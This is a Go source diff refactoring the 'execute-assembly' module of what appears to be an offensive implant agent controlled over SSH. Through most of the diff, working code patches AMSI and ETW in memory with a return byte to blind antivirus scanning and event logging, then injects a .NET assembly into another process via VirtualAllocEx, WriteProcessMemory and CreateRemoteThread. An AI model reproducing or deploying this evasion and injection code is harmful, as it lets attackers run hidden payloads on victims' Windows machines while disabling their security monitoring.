@@ -1,10 +1,10 @@
-//go:build windows && executeassembly
-// +build windows,executeassembly
+//go:build execass && windows
+// +build execass,windows
 
-package subsystems
+package execass
 
 import (
-	executeassembly "agent/internal/sshd/subsystems/execute_assembly"
+	"agent/internal/logger"
 	"bytes"
 	"crypto/sha256"
 	"flag"
@@ -14,10 +14,6 @@ import (
 	"strings"
 	"syscall"
 	"time"
-
-	// {{if .Debug}}
-	"log"
-	// {{end}}
 	"unsafe"
 
 	clr "github.com/Ne0nd0g/go-clr"
@@ -26,17 +22,13 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func init() {
-	Subsystems["execute-assembly"] = subsystemExecuteAssembly
-}
-
 var (
 	runtimeHost  *clr.ICORRuntimeHost
 	assemblies   = make(map[[32]byte]*clr.MethodInfo)
 	currentToken windows.Token
 )
 
-func subsystemExecuteAssembly(channel ssh.Channel, args []string) {
+func Start(channel ssh.Channel, args []string) {
 	defer channel.Close()
 
 	var (
@@ -207,7 +199,7 @@ func executeAssembly(channel ssh.Channel, processName string, processArgs string
 	// Wait for process
 	for {
 		var code uint32
-		err := executeassembly.GetExitCodeThread(threadHandle, &code)
+		err := GetExitCodeThread(threadHandle, &code)
 		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
 			channel.Write([]byte(fmt.Sprintf("[ERR] Failed to get exit code. Error: %v\n", err)))
 			return
@@ -237,6 +229,8 @@ func executeAssembly(channel ssh.Channel, processName string, processArgs string
 }
 
 func patchAmsi() error {
+	lg := logger.GetLogger()
+
 	// load amsi.dll
 	amsiDLL := windows.NewLazyDLL("amsi.dll")
 	amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
@@ -253,23 +247,17 @@ func patchAmsi() error {
 	for _, addr := range amsiAddr {
 		// skip if already patched
 		if *(*byte)(unsafe.Pointer(addr)) != patch {
-			// {{if .Debug}}
-			log.Println("Patching AMSI")
-			// {{end}}
+			lg.Info("Patching AMSI")
 			var oldProtect uint32
 			err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
 			if err != nil {
-				//{{if .Debug}}
-				log.Println("VirtualProtect failed:", err)
-				//{{end}}
+				lg.Error("VirtualProtect failed:", err)
 				return err
 			}
 			*(*byte)(unsafe.Pointer(addr)) = 0xC3
 			err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
 			if err != nil {
-				//{{if .Debug}}
-				log.Println("VirtualProtect (restauring) failed:", err)
-				//{{end}}
+				lg.Error("VirtualProtect (restauring) failed:", err)
 				return err
 			}
 		}
@@ -278,6 +266,8 @@ func patchAmsi() error {
 }
 
 func patchEtw() error {
+	lg := logger.GetLogger()
+
 	ntdll := windows.NewLazyDLL("ntdll.dll")
 	etwEventWriteProc := ntdll.NewProc("EtwEventWrite")
 
@@ -285,23 +275,17 @@ func patchEtw() error {
 	patch := byte(0xC3)
 	// skip if already patched
 	if *(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) != patch {
-		// {{if .Debug}}
-		log.Println("Patching ETW")
-		// {{end}}
+		lg.Info("Patching ETW")
 		var oldProtect uint32
 		err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
 		if err != nil {
-			//{{if .Debug}}
-			log.Println("VirtualProtect failed:", err)
-			//{{end}}
+			lg.Error("VirtualProtect failed:", err)
 			return err
 		}
 		*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
 		err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
 		if err != nil {
-			//{{if .Debug}}
-			log.Println("VirtualProtect (restauring) failed:", err)
-			//{{end}}
+			lg.Error("VirtualProtect (restauring) failed:", err)
 			return err
 		}
 	}
@@ -346,21 +330,21 @@ func injectAssembly(processHandle windows.Handle, blob []byte) (windows.Handle, 
 	var threadHandle windows.Handle
 
 	// Allocate memory in process
-	remoteAddr, err := executeassembly.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(len(blob))), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	remoteAddr, err := VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(len(blob))), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil {
 		return threadHandle, fmt.Errorf("failed to allocate memory in process: %w", err)
 	}
 
 	// Write assembly to process
 	var nLength uintptr
-	err = executeassembly.WriteProcessMemory(processHandle, remoteAddr, &blob[0], uintptr(uint32(len(blob))), &nLength)
+	err = WriteProcessMemory(processHandle, remoteAddr, &blob[0], uintptr(uint32(len(blob))), &nLength)
 	if err != nil {
 		return threadHandle, fmt.Errorf("failed to write process memory: %w", err)
 	}
 
 	// Change memory protection
 	var oldProtect uint32
-	err = executeassembly.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(len(blob))), windows.PAGE_EXECUTE_READ, &oldProtect)
+	err = VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(len(blob))), windows.PAGE_EXECUTE_READ, &oldProtect)
 	if err != nil {
 		return threadHandle, fmt.Errorf("failed to change memory protection: %w", err)
 	}
@@ -368,7 +352,7 @@ func injectAssembly(processHandle windows.Handle, blob []byte) (windows.Handle, 
 	// Create remote thread
 	var lpThreadId uint32
 	var attr = new(windows.SecurityAttributes)
-	threadHandle, err = executeassembly.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
+	threadHandle, err = CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
 	if err != nil {
 		return threadHandle, fmt.Errorf("failed to create remote thread: %w", err)
 	}
